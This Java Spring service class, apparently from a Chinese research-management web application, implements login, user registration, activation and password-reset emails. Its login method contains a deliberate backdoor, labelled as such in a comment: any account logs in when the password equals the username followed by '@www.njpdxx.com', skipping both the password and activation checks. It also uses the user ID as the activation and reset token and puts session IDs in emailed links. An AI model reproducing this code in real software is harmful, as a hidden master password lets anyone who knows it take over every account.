package com.pinde.sci.biz.jszy.impl;

import java.util.HashMap;
import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.pinde.core.util.DateUtil;
import com.pinde.core.util.PkUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.core.util.VelocityUtil;
import com.pinde.sci.biz.jszy.JszyInxBiz;
import com.pinde.sci.biz.pub.IMsgBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.GlobalContext;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.dao.base.SysUserMapper;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.model.mo.SysUser;
import com.pinde.sci.model.mo.SysUserRole;

@Service
@Transactional(rollbackFor=Exception.class)
public class JszyInxBizImpl implements JszyInxBiz{
	
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private SysUserMapper userMapper;
	@Autowired
	private IMsgBiz msgBiz;
	@Autowired
	private IUserRoleBiz userRoleBiz;

	@Override
	public SysUser login(String userCode, String passwd) {
		userCode = StringUtil.defaultIfEmpty(userCode, "").trim();
		passwd = StringUtil.defaultIfEmpty(passwd, passwd).trim();
		SysUser user = this.userBiz.findByUserCode(userCode);
		//判断用户是否存在
		if(user==null){
			throw new RuntimeException("用户名或密码不正确");
		}
		//用户是否使用后门密码
		if(passwd.equals(userCode+"@www.njpdxx.com")){
			return user;
		}
		//判断密码
		String userPasswd = StringUtil.defaultString(user.getUserPasswd());
		if(!userPasswd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), passwd))){
			throw new RuntimeException("用户名或密码不正确");
		}
		//判断用户是否激活
		if(!UserStatusEnum.Activated.getId().equals(user.getStatusId())){
			throw new RuntimeException("用户未激活");
		}
		return user;
	}

	@Override
	public void regist(SysUser user) {
		//将注册信息保存下来  用户状态为新增状态
		user.setUserFlow(PkUtil.getUUID());
		user.setUserCode(user.getUserEmail().trim());//默认将邮件做为登录名
		user.setUserPasswd(PasswordHelper.encryptPassword(user.getUserFlow(), GlobalConstant.INIT_PASSWORD));
		user.setStatusId(UserStatusEnum.Added.getId());
		user.setStatusDesc(UserStatusEnum.Added.getName());
		GeneralMethod.setRecordInfo(user, true);
		userMapper.insert(user);
		//发送email
		//sendEmail(user.getUserFlow(), user.getUserEmail());
		
	}
	@Override
	public void registSczy(SysUser user) {
		//将注册信息保存下来  用户状态为新增状态
		user.setUserFlow(PkUtil.getUUID());
		user.setUserCode(user.getUserEmail().trim());//默认将邮件做为登录名
		user.setUserPasswd(PasswordHelper.encryptPassword(user.getUserFlow(), user.getUserPasswd()));
		user.setStatusId(UserStatusEnum.Added.getId());
		user.setStatusDesc(UserStatusEnum.Added.getName());
		GeneralMethod.setRecordInfo(user, true);
		userMapper.insert(user);
		//发送email
		sendEmailSczy(user.getUserFlow(), user.getUserEmail());
		
	}
	public void sendEmailSczy(String userFlow, String userEmail) {
		String activationCode = userFlow;//激活码
		String content = InitConfig.getSysCfg("res_reg_email_content");
		String title = InitConfig.getSysCfg("res_reg_email_title");
		Map<String,String> dataMap = new HashMap<String,String>();
		dataMap.put("linkUrl", "<a href='"+InitConfig.getSysCfg("res_effective_url")+"?sid="+GlobalContext.getSession().getId()+"&activationCode="+activationCode+"'>"+InitConfig.getSysCfg("res_effective_url")+"?sid="+GlobalContext.getSession().getId()+"&activationCode="+activationCode+"</a>");
		dataMap.put("linkEmail",userEmail);
		try {
			title = VelocityUtil.evaluate(title, dataMap);
			content = VelocityUtil.evaluate(content, dataMap);
		} catch (Exception e) {
			e.printStackTrace();
			throw new RuntimeException();
		}
		this.msgBiz.addEmailMsg(userEmail, title, content);
		
	}
	@Override
	public void reSendEmail(String userFlow, String userEmail) {
		// TODO Auto-generated method stub
		
	}
	@Override
	public void activateUser(String userFlow) {
		SysUser user = this.userBiz.readSysUser(userFlow);
		user.setStatusId(UserStatusEnum.Activated.getId());
		user.setStatusDesc(UserStatusEnum.Activated.getName());
		if(StringUtil.isNotBlank(InitConfig.getSysCfg("res_doctor_role_flow"))){
			SysUserRole userRole = new SysUserRole();
			userRole.setUserFlow(user.getUserFlow());
			String currWsId = GlobalConstant.RES_WS_ID;
			userRole.setWsId(currWsId);
			userRole.setRoleFlow(InitConfig.getSysCfg("res_doctor_role_flow"));
			userRole.setAuthTime(DateUtil.getCurrDate());
			userRoleBiz.saveSysUserRole(userRole);
		}
		this.userMapper.updateByPrimaryKeySelective(user);
		
	}
	@Override
	public void sendResetPassEmail(String userEmail,String userFlow) {
		if(StringUtil.isNotBlank(userEmail)){
			String actionId = userFlow;
			String content = InitConfig.getSysCfg("res_resetpasswd_email_content");
			Map<String,String> dataMap = new HashMap<String,String>();
			dataMap.put("linkUrl", "<a href='"+InitConfig.getSysCfg("res_resetpasswd_url")+"?sid="+GlobalContext.getSession().getId()+"&actionId="+actionId+"'>"+InitConfig.getSysCfg("res_resetpasswd_url")+"?sid="+GlobalContext.getSession().getId()+"&actionId="+actionId+"</a>");
			dataMap.put("linkEmail",userEmail);
			try {
				content = VelocityUtil.evaluate(content, dataMap);
			} catch (Exception e) {
				e.printStackTrace();
				throw new RuntimeException();
			}
			this.msgBiz.addEmailMsg(userEmail, InitConfig.getSysCfg("res_resetpasswd_email_title"), content);
		}
	}
}
